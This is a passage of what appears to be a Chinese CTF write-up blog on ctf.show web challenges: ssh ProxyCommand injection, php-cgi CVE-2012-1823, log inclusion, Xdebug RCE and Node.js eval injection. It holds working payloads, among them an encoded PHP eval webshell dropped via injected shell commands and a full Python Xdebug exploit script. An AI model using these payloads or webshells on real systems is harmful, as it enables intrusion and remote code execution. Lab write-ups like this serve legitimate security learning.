class="code"><pre><span class="line">echo &quot;PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=&quot;|base64 -d &gt;/var/www/html/zf.php</span><br></pre></td></tr></table></figure><p>然后对这个在进行base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzNwbVhTazdQejQ9InxiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvemYucGhw</span><br></pre></td></tr></table></figure><p>如果进行base64编码后,含有+&#x3D;,都要进行url编码即%2b %3d,所以为了不出错,最好在对得到的base64编码后的字符进行url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzNwbVhTazdQejQ9InxiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvemYucGhw</span><br></pre></td></tr></table></figure><p>然后将hostname换成x+-oProxyCommand%3decho%09[编码后内容]|base64%09-d|sh}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzNwbVhTazdQejQ9InxiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvemYucGhw|base64%09-d|sh&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311515512.png" alt="image-20220331151507363"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311515803.png" alt="image-20220331151515659"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311515345.png" alt="image-20220331151536256"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311517620.png" alt="image-20220331151705536"></p><h1 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404184933022.png" alt="image-20220404184933022"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404185756088.png" alt="image-20220404185756088"></p><p>搜到一个cve-2012-1823</p><p>简单来说,就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p><p>启动下靶场</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404192923380.png" alt="image-20220404192923380"></p><p>?-s直接显示源码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404192957710.png" alt="image-20220404192957710"></p><p>还可以通过-d指定auto_prepend_file来制造任意文件包含漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php system(&#x27;nl `ls`&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404193447715.png" alt="image-20220404193447715"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404200331811.png" alt="image-20220404200331811"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404200651329.png" alt="image-20220404200651329"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404200704734.png" alt="image-20220404200704734"></p><h1 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:/&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>日志包含,修改ua</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404201716443.png" alt="image-20220404201716443"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404201644899.png" alt="image-20220404201644899"></p><p>写一句话,直接蚁剑连了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404202010697.png" alt="image-20220404202010697"></p><p>当然也可以session条件竞争,不过没到点不让玩</p><h1 id="web315"><a href="#web315" class="headerlink" title="web315"></a>web315</h1><p>xdebug是php的一个扩展,用于调试php代码,如果目标开启了远程调试模式,并设置remote_connect_bask&#x3D;1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">xdebug.remote_enable = 1</span><br></pre></td></tr></table></figure><p><code>xdebug.remote_connect_back</code> 的回连是通过自定义 Header（<code>xdebug.remote_addr_header</code>）、X-Forwarded-For 和 Remote-Addr 三个确定的，依次 fallback，所以即使配置了自定义 Header，也可以通过设置 XFF 头来指定服务器连接。</p><p>本地测试一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203311537.png" alt="image-20220404203311537"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203317640.png" alt="image-20220404203317640"></p><p>是一个phpinfo页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203928176.png" alt="image-20220404203928176"></p><p>先监听一个9000端口,在访问页面,如果有反应就存在.就可以确定开启了 Xdebug，且开启了 <code>xdebug.remote_connect_back</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://192.168.5.149:8080/index.php?XDEBUG_SESSION_START=phpstorm&#x27; -H &quot;X-Forwarded:192.168.5.139&quot;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404203917613.png" alt="image-20220404203917613"></p><p>利用脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">1</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_xml</span>(<span class="params">sock</span>):</span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop + <span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger</span>(<span class="params">url</span>):</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;local port&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(<span class="number">10</span>)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(args.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">    g = re.search(<span class="string">rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] May be not string result...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python py2.py -t http://192.168.5.149:8080/index.php -c &quot;shell_exec(&#x27;id&#x27;);&quot;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404204854544.png" alt="image-20220404204854544"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。</span><br></pre></td></tr></table></figure><p>远程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python e.py -t http://f5720fbb-d704-4892-b328-63480e7341bc.challenge.ctf.show/index.php -c &quot;shell_exec(&#x27;id&#x27;);&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://9def021a-8a10-4b73-a5e3-0b2d9a9f80d0.challenge.ctf.show/index.php?XDEBUG_SESSION_START=phpstorm&#x27; -H &quot;X-Forwarded:https://c368-112-38-217-12.ngrok.io&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python exp.py -t http://49.235.148.38:28100/index.php -c &quot;shell_exec(&#x27;id&#x27;);&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.js</title>
      <link href="/ctfshow/ctf.show/node.js/"/>
      <url>/ctfshow/ctf.show/node.js/</url>
      
        <content type="html"><![CDATA[<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p><strong>node.js</strong></p><p>node.js是一个基于Chrome v8引擎的javascript运行环境,可以说node.js是一个运行环境,或者说是一个js语言解释器而不是某种库</p><p>nodejs是基于chrome的v8引擎开发的一个c++程序,目的是用来提供一个js的运行环境.最早nodejs主要是安装在服务器上,辅助大家使用js开发高性能服务器代码,但是后来node.js在前段也大放异彩,带来了web前段开发的革命.node.js下运行js代码有两种方式,一种是在node.js的交互环境下进行,另一种是把代码写入文件中,然后用node命令执行文件代码.node.js跟浏览器是不同的环境,写js代码的时候要注意这些差异.</p><p><strong>题目</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281253885.png" alt="image-20220328125343817"></p><p>总共发现有两个js文件,一个是user.js</p><p><strong>user.js</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>得知username为CTFSHOW与password为123456</p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;<span class="comment">//从user.js中取出username和password来</span></span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);<span class="comment">//name不能等于CTFSHOW大写的,并且提交的name的大写要和user.js的username一样,并且提交的password要和user.js的一样</span></span><br><span class="line">  <span class="comment">//那么这里直接就提交小写的ctfshow和123456就好了</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);    <span class="comment">//登录成功就返回flag          </span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281303825.png" alt="image-20220328130358724"></p><h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311607473.png" alt="image-20220331160750371"></p><p>查看源码发现提示参数eval</p><p>猜测底层代码可能是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&#x27;console.log(xxx)&#x27;)</span><br></pre></td></tr></table></figure><p>可以利用child_process的exec来执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://de299747-2846-4689-ba6c-07f35da5aa82.challenge.ctf.show/?eval=require(&#x27;child_process&#x27;).exec(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311616011.png" alt="image-20220331161615903"></p><p>但是返回了两个object</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311616505.png" alt="image-20220331161656420"></p><p>原因就是这个exec返回值也是childprocess</p><p>还可以使用execSync()</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311621612.png" alt="image-20220331162150508"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311618438.png" alt="image-20220331161816355"></p><p>还有spawnSync()函数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311622114.png" alt="image-20220331162224018"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout.toString();</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl00g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p>不需要引入模块的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure><h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><h2 id="过滤exec字符的命令执行"><a href="#过滤exec字符的命令执行" class="headerlink" title="过滤exec字符的命令执行"></a>过滤exec字符的命令执行</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412211503556.png" alt="image-20220412211503556"></p><p>依旧是命令执行,但是这次exec被过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require( &#x27;child_process&#x27; ).spawnSync( &#x27;ls&#x27; ).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413131928113.png" alt="image-20220413131928113"></p><p>字符串拼接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&quot;child_process&quot;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;cat fl001g.txt&#x27;) </span><br><span class="line">?eval=require( &#x27;child_process&#x27; ).spawnSync( &#x27;cat&#x27;,[&#x27;fl001g.txt&#x27;] ).stdout.toString()</span><br></pre></td></tr></table></figure><p>读取函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&quot;fs&quot;).readdirSync(&#x27;.&#x27;) 查看当前目录（换成/.可查看根目录）</span><br><span class="line">?eval=require(&quot;fs&quot;).readFileSync(&#x27;fl001g.txt&#x27;) --查看指定文件</span><br></pre></td></tr></table></figure><p>在参数内部用eval拼接整体字符串，外层的eval就可以执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=eval(&quot;require(&#x27;child_process&#x27;).exe&quot;+&quot;cSync(&#x27;ls&#x27;)&quot;)</span><br></pre></td></tr></table></figure><h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><h2 id="js数组对象"><a href="#js数组对象" class="headerlink" title="js数组对象"></a>js数组对象</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.php数组就是数组，不能当做字符串调用；而js中几乎每一个数据类型都继承了Object类，拥有toString()方法，如果没有被重写，就返回[object type]</p><p>2.php中，无论是a[0]&#x3D;1,a[1]&#x3D;3…这种key为0,1,2…递增的，还是a[‘x’]&#x3D;1,a[‘y’]&#x3D;2这种自定义key的，都叫做数组array；而js中，前者叫数组，后者叫对象（Object）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a + <span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b + <span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">#[object <span class="title class_">Object</span>]flag&#123;xxx&#125;</span><br><span class="line">#[object <span class="title class_">Object</span>]flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p>自然这两个的md5也是相等的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413134209316.png" alt="image-20220413134209316"></p><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><h3 id="prototype和-proto-分别是什么"><a href="#prototype和-proto-分别是什么" class="headerlink" title="prototype和__proto__分别是什么"></a>prototype和__proto__分别是什么</h3><p>javascript中我们要定义一个类,需要以定义构造函数的方式来定义</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure><p>Foo函数的内容,就是Foo类的构造函数,而this.bar就是Foo类的一个属性.一个类必然有一些方法,类似属性this.bar,我们也可以将方法定义在构造函数的内部</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>但是这样写有一个问题,就是每当我们创建一个Foo对象的时候,this.show &#x3D; function 就会执行一次,这个show方法实际上是绑定在对象上面的,而不是绑定在类中.我们希望在创建类的时候只创建一次show方法,增时候就需要使用原型(prototype)了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>我们可以认为原型prototype是类Foo的一个属性,而所有用Foo类实例化的对象,都将拥有这个属性中的所有内容,包括变量和方法.比如上面的foo对象,其天生就有foo.show()方法</p><p>我们可以通过Foo.prototype来访问Foo类的原型,但是Foo实例化出来的对象,是不能通过prototype访问原型的.这个时候,就该到_<em>proto</em>_</p><p>一个Foo实例化出来的foo对象,可以通过foo.__proto__属性来访问Foo类的原型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foo.__proto__ = Foo.prototype</span><br></pre></td></tr></table></figure><ol><li>prototype是一个类的属性,所有类对象在实例化的时候将会拥有prototype中的属性和方法</li><li>一个对象的__proto__属性,指向这个对象所在类的prototype属性</li></ol><h3 id="javascript原型链继承"><a href="#javascript原型链继承" class="headerlink" 